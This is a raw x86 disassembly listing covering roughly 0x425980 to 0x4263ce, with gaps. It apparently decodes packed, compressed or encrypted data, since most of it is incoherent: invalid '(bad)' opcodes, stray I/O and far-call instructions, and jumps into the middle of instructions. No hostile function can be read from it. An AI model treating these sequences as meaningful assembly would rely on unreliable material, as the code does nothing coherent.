  425980:	enter  0x98ec,0x5a
  425984:	xor    al,0x4d
  425986:	shr    DWORD PTR [eax],1
  425988:	inc    ebp
  425989:	(bad)  
  42598a:	(bad)  
  42598b:	pop    ds
  42598c:	sbb    eax,0x1e094558
  425991:	cli    
  425992:	xor    esp,DWORD PTR ds:0x81bd0c77
  425998:	sbb    esi,DWORD PTR [eax]
  42599a:	add    DWORD PTR ds:0x85c44776,0x1c
  4259a1:	mov    DWORD PTR [eax+0xa6d5537],eax
  4259a7:	aas    
  4259a8:	cmp    ebp,ecx
  4259aa:	xor    bh,BYTE PTR [edi]
  4259ac:	ins    DWORD PTR es:[edi],dx
  4259ad:	mov    edi,0x9d5c31b8
  4259b2:	or     eax,0xa3b3cf4c
  4259b7:	jno    0x4259b0
  4259b9:	cmovb  ecx,DWORD PTR [ecx-0x66]
  4259bd:	and    DWORD PTR [ebx],edi
  4259bf:	retf   
  4259c0:	dec    esi
  4259c1:	xchg   BYTE PTR [ecx-0x3bdce5dc],ch
  4259c7:	cs mov edx,0x8b7b5873
  4259cd:	jns    0x4259bf
  4259cf:	pop    ss
  4259d0:	adc    al,bl
  4259d2:	(bad)  
  4259d3:	fcmove st,st(7)
  4259d5:	push   edi
  4259d6:	enter  0x6fff,0x78
  4259da:	fsub   st(7),st
  4259dc:	js     0x4259fd
  4259de:	(bad)  
  4259df:	not    DWORD PTR [edi]
  4259e1:	mov    cl,BYTE PTR [esi-0x3b70c7d7]
  4259e7:	sbb    ch,cl
  4259e9:	fist   DWORD PTR [edx+0x72bddf02]
  4259ef:	jmp    0x4259b9
  4259f1:	sub    eax,DWORD PTR [eax-0x66]
  4259f4:	cdq    
  4259f5:	mov    eax,0x9329fddb
  4259fa:	inc    edi
  4259fb:	xchg   BYTE PTR [eax],ch
  4259fd:	hlt    
  4259fe:	push   edi
  4259ff:	in     al,0xa1
  425a01:	jnp    0x425a14
  425a03:	aas    
  425a04:	(bad)  
  425a06:	pop    edx
  425a08:	mov    edi,0x1201de12
  425a0d:	(bad)  
  425a0e:	mov    fs,edi
	...
  425a74:	shl    DWORD PTR [ebx+0x4],0x67
  425a78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425a79:	jcxz   0x425a63
  425a7c:	(bad)  
  425a7d:	fimul  DWORD PTR [edi+eax*4+0x56f2b4dd]
  425a84:	rcl    BYTE PTR [ecx+0x1040001],1
  425a8a:	add    BYTE PTR [eax],al
  425a8c:	daa    
  425a8d:	sub    DWORD PTR [edx+0x45],eax
  425a90:	xor    DWORD PTR [edx+0x62b9ef4f],ebp
  425a96:	inc    esp
  425a97:	nop
  425a98:	and    bh,BYTE PTR [ebx+0x39590dfa]
  425a9e:	jb     0x425a22
  425aa0:	xchg   esi,eax
  425aa1:	cmp    al,0x73
  425aa3:	mov    cs,WORD PTR [eax+0x7ddb8e20]
  425aa9:	dec    ecx
  425aaa:	sbb    bh,BYTE PTR [edx+0x5ee674d9]
  425ab0:	popa   
  425ab1:	pop    ecx
  425ab2:	stc    
  425ab3:	scas   eax,DWORD PTR es:[edi]
  425ab4:	pop    esp
  425ab5:	xchg   ebx,eax
  425ab6:	pusha  
  425ab7:	adc    ebx,DWORD PTR [edi-0x1be39fbb]
  425abd:	mov    ch,0xde
  425abf:	loopne 0x425a79
  425ac1:	push   es
  425ac2:	sbb    al,0x61
  425ac4:	dec    eax
  425ac5:	mov    dh,dl
  425ac7:	cld    
  425ac8:	fdiv   st,st(1)
  425aca:	ret    0xd1af
  425acd:	mov    ebx,0xd1ceb968
  425ad2:	leave  
  425ad3:	inc    eax
  425ad4:	sbb    al,0xb9
  425ad6:	fwait
  425ad7:	and    DWORD PTR [eax],ebx
  425ad9:	mov    bh,0x16
  425adb:	sub    al,0xba
  425add:	dec    edx
  425ade:	iret   
  425adf:	cwde   
  425ae0:	xor    ebp,esp
  425ae2:	popf   
  425ae3:	mov    ecx,0xcd8e86a0
  425ae8:	scas   al,BYTE PTR es:[edi]
  425ae9:	js     0x425ad4
  425aeb:	out    dx,eax
  425aec:	bnd call 0xd804451d
  425af2:	inc    eax
  425af4:	(bad)  
  425af5:	and    al,0xc7
  425af7:	sbb    al,0x10
  425af9:	mov    bh,0x3
  425afb:	adc    eax,0x31bed694
  425b00:	inc    edx
  425b01:	je     0x425b00
  425b03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425b04:	cs addr16 call 0xcf307967
  425b0b:	addr16 sar bh,1
  425b0e:	cmp    dh,BYTE PTR [ebx-0x526b225]
  425b14:	push   ebx
  425b15:	call   0x9db:0x310e43aa
  425b1c:	fwait
  425b1d:	sub    BYTE PTR [eax],ah
  425b1f:	mov    edi,esp
  425b21:	out    dx,al
  425b22:	popf   
  425b23:	jo     0x425b96
  425b25:	(bad)  
  425b26:	mov    ecx,0x83101d3d
  425b2b:	retf   
  425b2c:	cs pop ss
  425b2e:	sbb    edi,DWORD PTR [eax]
  425b30:	push   esp
  425b31:	xchg   ebp,eax
  425b32:	dec    ebp
  425b33:	cld    
  425b34:	pop    es
  425b35:	mov    ds:0x813c3cc4,al
  425b3a:	fild   WORD PTR [ebp-0x52]
  425b3d:	mov    esi,0xb57a2feb
  425b42:	stos   BYTE PTR es:[edi],al
  425b43:	(bad)  
  425b44:	xlat   BYTE PTR ds:[ebx]
  425b45:	outs   dx,BYTE PTR ds:[esi]
  425b46:	jne    0x425ad2
  425b48:	xchg   ebp,eax
  425b49:	pop    edx
  425b4a:	dec    ebp
  425b4b:	jb     0x425baf
  425b4d:	not    esi
  425b4f:	les    esp,FWORD PTR ds:0x4d48fe11
  425b55:	jnp    0x425b31
  425b57:	(bad)  
  425b58:	ficom  WORD PTR [ebx]
  425b5a:	xor    DWORD PTR [ebx],0xffffffdb
  425b5d:	imul   eax,DWORD PTR [ecx],0x40
  425b60:	int3   
  425b61:	and    bl,BYTE PTR [ebp+0x44b88691]
  425b67:	lods   eax,DWORD PTR ds:[esi]
  425b68:	jnp    0x425b3a
  425b6a:	sub    DWORD PTR [edx],edi
  425b6c:	(bad)  
  425b6d:	das    
  425b6e:	dec    ebx
  425b6f:	dec    ebx
  425b70:	push   ds
  425b71:	lods   al,BYTE PTR ds:[esi]
  425b72:	xchg   edi,eax
  425b73:	dec    ebp
  425b74:	pop    ecx
  425b75:	jns    0x425bc9
  425b77:	into   
  425b78:	daa    
  425b79:	jbe    0x425b22
  425b7b:	in     al,dx
  425b7c:	loop   0x425b06
  425b7e:	scas   eax,DWORD PTR es:[edi]
  425b7f:	mov    al,0xe9
  425b81:	clc    
  425b82:	and    ebp,DWORD PTR fs:[esi-0x37]
  425b86:	sub    DWORD PTR [ebx+0x75fbda15],0x6b
  425b8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425b8e:	pusha  
  425b8f:	pop    esp
	...
  425bf4:	(bad)  
  425bf5:	clc    
  425bf6:	jnp    0x425c4e
  425bf8:	jg     0x425bd1
  425bfa:	in     eax,dx
  425bfb:	cli    
  425bfc:	enter  0xe6cd,0x96
  425c00:	mov    edx,DWORD PTR [ebp-0x6d2b7d3b]
  425c06:	add    DWORD PTR [eax],eax
  425c08:	add    al,0x1
  425c0a:	add    BYTE PTR [eax],al
  425c0c:	pop    ds
  425c0d:	shr    DWORD PTR [ecx-0x48231abe],cl
  425c13:	imul   ecx,DWORD PTR [ebp+0x15845a4e],0xba6890c4
  425c1d:	push   0x8a598b1f
  425c22:	test   DWORD PTR [bx],ebp
  425c25:	icebp  
  425c26:	jle    0x425c9d
  425c28:	rcr    DWORD PTR [edi-0x4c],cl
  425c2b:	scas   al,BYTE PTR es:[edi]
  425c2c:	lods   al,BYTE PTR ds:[esi]
  425c2d:	clc    
  425c2e:	jmp    FWORD PTR ds:0x7dd2f0d0
  425c34:	sbb    ebp,DWORD PTR [esi+0xfad6cdd]
  425c3a:	pop    ebp
  425c3b:	lods   al,BYTE PTR ds:[esi]
  425c3c:	lahf   
  425c3d:	or     ch,BYTE PTR ds:0xc6b1c2fb
  425c43:	and    eax,0x996379a8
  425c48:	jmp    0x425c88
  425c4a:	mov    dl,BYTE PTR ss:[esi+0x20]
  425c4e:	pop    ebx
  425c4f:	or     dl,BYTE PTR [ecx-0x7e]
  425c52:	repz push edi
  425c54:	mov    edx,0x9d2d9214
  425c59:	dec    ebx
  425c5a:	jmp    0x425c47
  425c5c:	ins    DWORD PTR es:[edi],dx
  425c5d:	sbb    dh,BYTE PTR [ecx+ebx*2-0x1a792b95]
  425c64:	jnp    0x425c23
  425c66:	pop    edi
  425c67:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425c68:	outs   dx,BYTE PTR ds:[esi]
  425c69:	xchg   edx,eax
  425c6a:	mov    dl,0x9a
  425c6c:	mov    eax,0xa5209967
  425c71:	add    BYTE PTR [ecx+0x5efc7d71],0x52
  425c78:	jmp    0x425bfc
  425c7a:	inc    ecx
  425c7b:	dec    edx
  425c7c:	adc    DWORD PTR [eax],edx
  425c7e:	or     BYTE PTR [ebp-0x2d2c741a],bl
  425c84:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c85:	test   DWORD PTR [ecx],edx
  425c87:	jmp    0x425cd6
  425c89:	push   0x11
  425c8b:	in     eax,0x70
  425c8d:	fs dec eax
  425c8f:	scas   eax,DWORD PTR es:[edi]
  425c90:	mov    al,ds:0x9bf8c146
  425c95:	push   edx
  425c96:	inc    eax
  425c97:	rcr    BYTE PTR [ebx-0x78],cl
  425c9a:	or     ah,BYTE PTR [ebx]
  425c9c:	bswap  esi
  425c9e:	loope  0x425cc7
  425ca0:	pop    edi
  425ca1:	imul   esp,DWORD PTR [ecx],0x4263d0e5
  425ca7:	adc    esi,ebx
  425ca9:	jmp    0x425cd3
  425cab:	sub    cl,bl
  425cad:	jo     0x425cf3
  425caf:	(bad)  
  425cb0:	aad    0xa8
  425cb2:	mov    dl,0x3b
  425cb4:	jae    0x425cbb
  425cb6:	add    eax,0xaea5dcb0
  425cbb:	imul   ebx,DWORD PTR [ecx+0x6c],0xc
  425cbf:	or     BYTE PTR [edx-0xa616556],bl
  425cc5:	xchg   edx,eax
  425cc6:	or     DWORD PTR [edi+0x43],esp
  425cc9:	adc    DWORD PTR [esi],esi
  425ccb:	stos   BYTE PTR es:[edi],al
  425ccc:	adc    ecx,esp
  425cce:	sub    al,BYTE PTR [edi-0x4c0fcfe2]
  425cd4:	mov    BYTE PTR [edx],cl
  425cd6:	js     0x425cfc
  425cd8:	dec    ebx
  425cd9:	pop    edx
  425cda:	xchg   esp,eax
  425cdb:	leave  
  425cdc:	or     ebp,DWORD PTR [eax-0xdcea669]
  425ce2:	fisub  WORD PTR [ebp+0x53]
  425ce5:	inc    eax
  425ce6:	jecxz  0x425ce8
  425ce8:	jmp    0x2c08:0xceba78fe
  425cef:	pop    edx
  425cf0:	in     al,0xf1
  425cf2:	add    ch,cl
  425cf4:	lods   eax,DWORD PTR ds:[esi]
  425cf5:	(bad)  
  425cf6:	cmp    DWORD PTR [eax-0x60],ebp
  425cf9:	call   0x7004:0x9cfe5fca
  425d00:	xor    bl,cl
  425d02:	outs   dx,DWORD PTR ds:[esi]
  425d03:	cmc    
  425d04:	retf   0xef94
  425d07:	out    0x15,eax
  425d09:	leave  
  425d0a:	ror    DWORD PTR [ebp-0x34b632ea],0x0
	...
  425d71:	add    BYTE PTR [eax],al
  425d73:	add    bh,bh
  425d75:	lods   al,BYTE PTR ds:[esi]
  425d76:	fadd   QWORD PTR [edi]
  425d78:	fbstp  TBYTE PTR [edi-0x1]
  425d7b:	cld    
  425d7c:	gs addr16 stc 
  425d7f:	mov    ds:0x9ac9f81e,al
  425d84:	fcom   DWORD PTR [ebx+0x1040001]
  425d8a:	add    BYTE PTR [eax],al
  425d8c:	stc    
  425d8d:	jmp    0xca8cba28
  425d92:	adc    ebx,ecx
  425d94:	ja     0x425d39
  425d96:	mov    ecx,0xa1a24147
  425d9b:	and    al,0x2c
  425d9d:	js     0x425dd2
  425d9f:	jo     0x425ddd
  425da1:	aam    0x1f
  425da3:	sub    eax,0x235487ff
  425da8:	je     0x425d7f
  425daa:	int    0x4f
  425dac:	out    dx,eax
  425dad:	jecxz  0x425dbc
  425daf:	addr16 xchg esi,eax
  425db1:	pop    ss
  425db2:	ins    BYTE PTR es:[edi],dx
  425db3:	test   BYTE PTR [ebx+ecx*8],al
  425db6:	cwde   
  425db7:	in     eax,dx
  425db8:	xchg   ebp,eax
  425db9:	out    0x83,al
  425dbb:	aad    0xc5
  425dbd:	mov    ds:0xd1127c60,eax
  425dc2:	cmp    eax,0xe059b2b5
  425dc7:	pop    esp
  425dc8:	sti    
  425dc9:	out    0xb0,eax
  425dcb:	inc    ebp
  425dcc:	das    
  425dcd:	in     eax,dx
  425dce:	ror    DWORD PTR [edi],cl
  425dd0:	sub    BYTE PTR [edx],bl
  425dd2:	pop    ebx
  425dd3:	shl    bh,1
  425dd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425dd6:	adc    DWORD PTR [edx-0xd],ebp
  425dd9:	sbb    DWORD PTR ds:0x6c881dc9,edx
  425ddf:	out    dx,al
  425de0:	or     al,0xc
  425de2:	xor    al,0x15
  425de4:	imul   ecx,DWORD PTR [edi],0x5d
  425de7:	add    ah,al
  425de9:	mov    BYTE PTR ds:0x4cd9adc0,bl
  425def:	push   cs
  425df0:	imul   ebx,DWORD PTR [ecx+0x67],0x9219d687
  425df7:	push   ebx
  425df8:	xchg   esp,eax
  425df9:	xchg   BYTE PTR [ecx-0x556ee94a],ch
  425dff:	fdivr  st,st(6)
  425e01:	sahf   
  425e02:	(bad)  
  425e04:	popa   
  425e05:	arpl   WORD PTR ds:0x4c4e800b,di
  425e0b:	pusha  
  425e0c:	bound  edi,QWORD PTR [ebp-0x36]
  425e0f:	jae    0x425e5f
  425e11:	add    al,0xca
  425e13:	pop    edi
  425e14:	cmp    DWORD PTR [esp+ebp*8],ebx
  425e17:	pop    edx
  425e18:	adc    al,0xf0
  425e1a:	call   0x7090a7ba
  425e1f:	dec    ecx
  425e20:	fisttp WORD PTR [eax+0x37]
  425e23:	dec    esp
  425e24:	cmp    eax,0xa179fec6
  425e29:	or     BYTE PTR [ebx+0xcd2cdec],cl
  425e2f:	mov    al,0x59
  425e31:	xchg   esi,eax
  425e32:	shr    BYTE PTR [edi+0x74a4f429],0xdb
  425e39:	push   edi
  425e3a:	and    eax,0x74d5fab5
  425e3f:	mov    ebp,0x8bf571ef
  425e44:	repz sbb BYTE PTR [edi],dl
  425e47:	ins    DWORD PTR es:[edi],dx
  425e48:	lea    eax,[eax+ebp*2+0x2b]
  425e4c:	mov    ds:0x32693740,eax
  425e51:	jge    0x425e73
  425e53:	sub    bl,bh
  425e55:	or     al,0x60
  425e57:	popf   
  425e58:	jne    0x425e64
  425e5a:	mov    al,0x1f
  425e5c:	mov    ebp,0x85a53408
  425e61:	fwait
  425e62:	test   BYTE PTR [edi],0xca
  425e65:	jl     0x425ea6
  425e67:	sti    
  425e68:	xchg   edi,eax
  425e69:	in     al,dx
  425e6a:	mov    bh,BYTE PTR [ecx+0x46]
  425e6d:	jo     0x425e09
  425e6f:	rdpmc  
  425e71:	cld    
  425e72:	pop    ebp
  425e73:	ret    0x3d8f
  425e76:	sahf   
  425e77:	mov    cl,0xb4
  425e79:	xchg   bx,ax
  425e7b:	mov    ebx,DWORD PTR [ebp+0x6b]
  425e7e:	lods   al,BYTE PTR ds:[esi]
  425e7f:	call   0xa9d8:0x1de20474
  425e86:	push   ebp
  425e87:	push   ds
  425e88:	ins    DWORD PTR es:[edi],dx
  425e89:	mov    dh,0x75
  425e8b:	rol    DWORD PTR [ebx+0x6a1571],cl
	...
  425ef1:	add    BYTE PTR [eax],al
  425ef3:	add    dh,al
  425ef5:	jl     0x425f48
  425ef7:	sar    bl,1
  425ef9:	std    
  425efa:	(bad)  
  425efb:	jle    0x425ec9
  425efd:	pop    ss
  425efe:	popf   
  425eff:	scas   eax,DWORD PTR es:[edi]
  425f00:	stc    
  425f01:	mul    cl
  425f03:	pop    ecx
  425f04:	fcom   QWORD PTR [ecx+eax*1+0x10400]
  425f0b:	add    BYTE PTR [edi+ecx*1],ch
  425f0e:	aas    
  425f0f:	mov    ah,0x3b
  425f11:	push   0xffffffb5
  425f13:	xor    ecx,esp
  425f15:	mov    ebp,0xed196900
  425f1a:	jmp    0x425f78
  425f1c:	(bad)  
  425f1d:	call   DWORD PTR [ecx]
  425f1f:	and    al,0x40
  425f21:	pop    ebp
  425f22:	inc    edx
  425f23:	jne    0x425ead
  425f25:	and    eax,0xfecba994
  425f2a:	push   esi
  425f2b:	push   ebx
  425f2c:	popa   
  425f2d:	sbb    ebp,DWORD PTR [ecx-0x29e0ce26]
  425f33:	adc    dl,dh
  425f35:	sar    DWORD PTR [edi],1
  425f37:	mov    esp,gs
  425f39:	mov    al,0x15
  425f3b:	sub    DWORD PTR [eax-0x1725ef69],0x15bd4eb5
  425f45:	xchg   esi,eax
  425f46:	mov    bh,0x94
  425f48:	and    eax,0x5a2f0d84
  425f4d:	jmp    0xf6301314
  425f52:	jnp    0x425f3f
  425f54:	scas   eax,DWORD PTR es:[edi]
  425f55:	push   ebp
  425f56:	mov    ebp,0x231afc2
  425f5b:	fsub   st(7),st
  425f5d:	stos   DWORD PTR es:[edi],eax
  425f5e:	and    eax,0xa10755c9
  425f63:	lea    edi,[edx-0x5114b2ea]
  425f69:	hlt    
  425f6a:	xchg   ecx,edx
  425f6c:	stc    
  425f6d:	mov    ah,0x7c
  425f6f:	mov    ah,0x1b
  425f71:	je     0x425f5c
  425f73:	fstp   TBYTE PTR [edx-0x5a202823]
  425f79:	and    esp,DWORD PTR [ecx-0x3b]
  425f7c:	pushf  
  425f7d:	pop    esi
  425f7e:	adc    al,0xbc
  425f80:	push   edx
  425f81:	daa    
  425f82:	mov    ss,edi
  425f84:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425f86:	inc    ebx
  425f87:	push   edi
  425f88:	add    bh,BYTE PTR [esi+0x4955558d]
  425f8e:	fistp  DWORD PTR [eax+0x31]
  425f91:	or     dh,bl
  425f93:	dec    ecx
  425f94:	icebp  
  425f95:	or     eax,0xa2315199
  425f9a:	outs   dx,DWORD PTR ds:[esi]
  425f9b:	sbb    al,0xba
  425f9d:	mov    eax,0x72fcc59c
  425fa2:	xchg   edx,eax
  425fa3:	add    ch,BYTE PTR [edx+0x3fd3df7]
  425fa9:	xchg   bh,bh
  425fab:	mov    bh,0xbd
  425fad:	and    eax,0xf5138d2c
  425fb2:	cdq    
  425fb3:	clc    
  425fb4:	add    DWORD PTR [ebx+ebx*2-0x45591f74],0x8b05f53f
  425fbf:	clc    
  425fc0:	jae    0x425fb8
  425fc2:	mov    ds:0x9ca51b0a,al
  425fc7:	pop    edx
  425fc8:	jae    0x425fae
  425fca:	es push eax
  425fcc:	(bad)  
  425fcd:	pop    edx
  425fce:	add    DWORD PTR [ecx+eiz*8-0x30aecb5f],ebp
  425fd5:	fcom   DWORD PTR [esi+0x6e]
  425fd8:	pop    esp
  425fd9:	mov    al,ds:0xab9e956
  425fde:	test   DWORD PTR [edx-0xa],ebp
  425fe1:	jmp    0x425fd8
  425fe3:	sub    ch,bl
  425fe5:	lock imul ebp,esp,0xea3fa4a7
  425fec:	and    DWORD PTR [edx],ebp
  425fee:	pop    ds
  425fef:	inc    esi
  425ff0:	scas   eax,DWORD PTR es:[edi]
  425ff1:	ror    DWORD PTR [ebx],0x1d
  425ff4:	push   ebx
  425ff5:	add    eax,0x2eaa6dc1
  425ffa:	stc    
  425ffb:	fmul   QWORD PTR [ebx-0x4f216e73]
  426001:	pop    ebp
  426002:	or     ah,BYTE PTR [esi]
  426004:	sbb    eax,0xbdc301f7
  426009:	popf   
  42600a:	push   edi
  42600b:	pop    ds
  42600c:	imul   ebp,DWORD PTR [ebx],0x20
  42600f:	js     0x426011
	...
  426071:	add    BYTE PTR [eax],al
  426073:	add    BYTE PTR [ecx],bh
  426075:	cwde   
  426076:	or     eax,DWORD PTR [esi]
  426078:	stos   DWORD PTR es:[edi],eax
  426079:	xchg   edi,eax
  42607a:	cmp    eax,0x304575bf
  42607f:	in     al,dx
  426080:	inc    ebx
  426081:	push   ecx
  426082:	jge    0x4260af
  426084:	loopne 0x42601b
  426086:	add    DWORD PTR [eax],eax
  426088:	add    al,0x1
  42608a:	add    BYTE PTR [eax],al
  42608c:	or     DWORD PTR [eax],ecx
  42608e:	xchg   ch,bl
  426090:	aam    0xf5
  426092:	aad    0xc6
  426094:	pop    esi
  426095:	pop    esp
  426096:	mov    ebx,0xb8bba8e7
  42609b:	leave  
  42609c:	adc    al,0x68
  42609e:	repnz adc al,0x37
  4260a1:	fbld   TBYTE PTR [ebx+ebx*4+0x5e4d2bfd]
  4260a8:	mov    bh,0x32
  4260aa:	xchg   esp,eax
  4260ac:	mov    ebp,0x7eb4e6a7
  4260b1:	add    DWORD PTR [eax+0x70be44e5],0x71c01f04
  4260bb:	add    eax,0x8a0b4c7c
  4260c0:	enter  0xecb0,0x54
  4260c4:	jle    0x4260b5
  4260c6:	inc    ebp
  4260c7:	mov    edi,0xc4b9be44
  4260cc:	dec    ebp
  4260cd:	imul   BYTE PTR [ebx-0x11]
  4260d0:	pop    eax
  4260d1:	(bad)  
  4260d2:	mov    dl,cl
  4260d4:	test   DWORD PTR [eax],esi
  4260d6:	cmp    BYTE PTR [esp+edi*2-0x4c],bl
  4260da:	dec    edi
  4260db:	sub    dh,BYTE PTR [edx+0x75]
  4260de:	inc    esi
  4260df:	rol    DWORD PTR [ecx+0x6cf1b4ba],1
  4260e5:	push   es
  4260e6:	cmp    al,0x8a
  4260e8:	add    BYTE PTR [ebp-0x5c],al
  4260eb:	dec    esp
  4260ec:	pushf  
  4260ed:	adc    DWORD PTR [ebx+ebx*8+0x7c],ebp
  4260f1:	mov    ds:0xb6d4beec,al
  4260f6:	out    0x4f,al
  4260f8:	and    al,0xf3
  4260fa:	aas    
  4260fb:	stos   BYTE PTR es:[edi],al
  4260fc:	jo     0x426158
  4260fe:	and    BYTE PTR [ebp-0x5],dl
  426101:	arpl   WORD PTR [eax],ax
  426103:	xchg   ecx,eax
  426104:	cld    
  426105:	mov    bl,0x16
  426107:	pop    edi
  426108:	rcl    DWORD PTR [edi],1
  42610a:	js     0x4260c8
  42610c:	mov    bl,dl
  42610e:	ror    bh,0x92
  426111:	xchg   ebx,eax
  426112:	xchg   esp,eax
  426113:	(bad)  
  426114:	and    ebx,DWORD PTR [ecx-0x75]
  426117:	inc    ebx
  426118:	push   edx
  426119:	sbb    dh,bh
  42611b:	dec    edi
  42611c:	jl     0x4260e1
  42611e:	xor    al,0x4f
  426120:	loope  0x42616c
  426122:	add    eax,0xbe81b1c6
  426127:	sub    al,0xc1
  426129:	daa    
  42612a:	mov    ds:0x4d544f1b,eax
  42612f:	pushf  
  426130:	bound  edx,QWORD PTR [ecx]
  426132:	into   
  426133:	cmc    
  426134:	add    al,0xa8
  426136:	retf   
  426137:	ins    BYTE PTR es:[edi],dx
  426138:	sbb    ah,dh
  42613a:	adc    edi,DWORD PTR [ecx+0x17]
  42613d:	or     dl,BYTE PTR [edx-0x58]
  426140:	into   
  426141:	jns    0x4261af
  426143:	push   ecx
  426144:	or     BYTE PTR [eax+ecx*8-0x79336f0b],0x65
  42614c:	mov    dh,0x50
  42614e:	dec    edx
  42614f:	adc    ch,BYTE PTR [edi+0x7c]
  426152:	xchg   BYTE PTR [ebx],bl
  426154:	jg     0x4260fd
  426156:	add    BYTE PTR [ebx-0x5e],ah
  426159:	ins    DWORD PTR es:[edi],dx
  42615a:	xor    DWORD PTR [eax+0x5a],0xfffffff2
  42615e:	mov    ah,0x4c
  426160:	jae    0x4260f9
  426162:	push   eax
  426163:	mov    al,0x8a
  426165:	mov    ecx,0xa4d654a8
  42616a:	mov    bh,0x87
  42616c:	jo     0x426191
  42616e:	mov    esi,0x85afb6d5
  426173:	adc    ah,dh
  426175:	pop    esi
  426176:	call   0x7384:0xef1e3a8e
  42617d:	cmp    DWORD PTR [ecx],ebx
  42617f:	jns    0x4261d1
  426181:	add    ecx,ecx
  426183:	popf   
  426184:	adc    al,0x97
  426186:	repnz std 
  426188:	mov    ah,0xec
  42618a:	das    
  42618b:	jmp    0x0:0x792248cc
	...
  4261f2:	add    BYTE PTR [eax],al
  4261f4:	fwait
  4261f5:	and    DWORD PTR [edi],ecx
  4261f7:	popa   
  4261f8:	mov    edi,0xb7fbff6f
  4261fd:	xor    DWORD PTR [ecx+0x5bf3e527],0xffffffc0
  426204:	in     al,0x96
  426206:	add    DWORD PTR [eax],eax
  426208:	add    al,0x1
  42620a:	add    BYTE PTR [eax],al
  42620c:	mov    ds:0x652988a8,al
  426211:	adc    al,0xcd
  426213:	inc    ecx
  426214:	call   0xe768ae53
  426219:	xchg   ebp,eax
  42621a:	mov    ah,0x16
  42621c:	mov    dh,0xba
  42621e:	das    
  42621f:	ins    BYTE PTR es:[edi],dx
  426220:	lods   eax,DWORD PTR ds:[esi]
  426221:	inc    esi
  426222:	and    DWORD PTR [ebx*1+0x63af6f11],ecx
  426229:	jmp    0xa65200cb
  42622e:	out    0xdd,eax
  426230:	push   ecx
  426231:	aaa    
  426232:	xlat   BYTE PTR ds:[ebx]
  426233:	je     0x426267
  426235:	fwait
  426236:	mov    eax,ds:0x68cab9cd
  42623b:	hlt    
  42623c:	out    0xbb,eax
  42623e:	cmp    cl,bl
  426240:	jbe    0x42628d
  426242:	dec    ebx
  426243:	pop    ss
  426244:	fdiv   DWORD PTR [esi-0x111f19da]
  42624a:	cs mov esp,0x58ddb6c1
  426250:	(bad)  
  426252:	push   0xa9eb8a0e
  426257:	sbb    al,0x11
  426259:	arpl   WORD PTR [edx-0x596148b],ax
  42625f:	or     al,0xaf
  426261:	adc    cl,BYTE PTR [ecx+0x3b495086]
  426267:	hlt    
  426268:	pusha  
  426269:	cmp    bl,BYTE PTR [edx+0x32692bfa]
  42626f:	mov    ebx,0x4db0771b
  426274:	pop    esi
  426275:	add    eax,0x62a922ad
  42627a:	xchg   ebp,eax
  42627b:	pop    ss
  42627c:	mov    eax,ds:0x61ba2345
  426281:	or     eax,0xdd55c662
  426286:	pop    ss
  426287:	inc    ebx
  426288:	mov    eax,ds:0xbbb6060b
  42628d:	fwait
  42628e:	or     BYTE PTR [ecx+0x1b356cdf],al
  426294:	sub    eax,0xfbe6081c
  426299:	sub    ebp,edi
  42629b:	push   edi
  42629c:	inc    ebp
  42629d:	out    dx,eax
  42629e:	mov    es,WORD PTR [eax]
  4262a0:	mov    bh,0xda
  4262a2:	retf   0xdbc7
  4262a5:	mov    al,0xc
  4262a7:	gs int 0x22
  4262aa:	pusha  
  4262ab:	pop    ebp
  4262ac:	cdq    
  4262ad:	xor    ecx,DWORD PTR [esi-0xaa7dd84]
  4262b3:	and    BYTE PTR [edx+0xb],al
  4262b6:	lods   al,BYTE PTR ds:[esi]
  4262b7:	daa    
  4262b8:	loop   0x426303
  4262ba:	dec    edx
  4262bb:	mov    cl,0x2f
  4262bd:	repnz neg DWORD PTR [eax]
  4262c0:	lods   eax,DWORD PTR ds:[esi]
  4262c1:	cmp    al,0xeb
  4262c3:	sahf   
  4262c4:	mov    ebp,0x5d10691d
  4262c9:	lahf   
  4262ca:	push   es
  4262cb:	ret    0xda42
  4262ce:	jno    0x42625a
  4262d0:	stos   BYTE PTR es:[edi],al
  4262d1:	enter  0x2cec,0xce
  4262d5:	fsubr  QWORD PTR [esi+eax*1+0x6]
  4262d9:	mov    dh,0x8c
  4262db:	push   edi
  4262dc:	pop    edi
  4262dd:	and    eax,0x1d526ff1
  4262e2:	add    DWORD PTR [edx-0x26],ecx
  4262e5:	add    esi,esp
  4262e7:	stos   DWORD PTR es:[edi],eax
  4262e8:	int    0x37
  4262ea:	jg     0x426340
  4262ec:	mov    ecx,0x78767c09
  4262f1:	aaa    
  4262f2:	and    al,0x52
  4262f4:	push   ss
  4262f5:	sub    ch,BYTE PTR [esi+ecx*2-0x84f3890]
  4262fc:	xor    cl,al
  4262fe:	pop    ecx
  4262ff:	pop    eax
  426300:	pop    ss
  426301:	mov    ds:0xd110e23f,al
  426306:	dec    eax
  426307:	cs (bad) 
  426309:	jg     0x4262f0
  42630b:	jp     0x4262c2
  42630d:	cmp    ebx,ebx
  42630f:	lods   al,BYTE PTR ds:[esi]
	...
  426374:	push   esp
  426375:	and    eax,0xeefd4e8d
  42637a:	xlat   BYTE PTR ds:[ebx]
  42637b:	aas    
  42637c:	dec    ecx
  42637d:	sbb    esi,edi
  42637f:	or     eax,0xa4f45f5b
  426384:	call   0x4426520
  426389:	add    DWORD PTR [eax],eax
  42638b:	add    BYTE PTR [ecx+edi*2+0x51],bl
  42638f:	ja     0x426409
  426391:	aam    0x32
  426393:	or     al,BYTE PTR [esi]
  426395:	mov    BYTE PTR [esi],0x72
  426398:	test   esi,ecx
  42639a:	or     dl,0x1c
  42639d:	xchg   DWORD PTR [ebp+0x1659f324],edx
  4263a3:	sbb    DWORD PTR [ecx],ebx
  4263a5:	and    eax,0x9d34f6c
  4263aa:	js     0x4263aa
  4263ac:	dec    eax
  4263ad:	lods   al,BYTE PTR ds:[esi]
  4263ae:	push   0x239e414c
  4263b3:	xchg   DWORD PTR ds:0xeaee2886,ebp
  4263b9:	xchg   edi,eax
  4263ba:	dec    ecx
  4263bb:	adc    BYTE PTR [edx-0x17],al
  4263be:	in     al,dx
  4263bf:	das    
  4263c0:	bound  esi,QWORD PTR [ecx+0x3b2141f0]
  4263c6:	dec    ecx
  4263c7:	test   al,0x2c
  4263c9:	cmp    eax,0x39a0d876
  4263ce:	mov    dl,0x7e
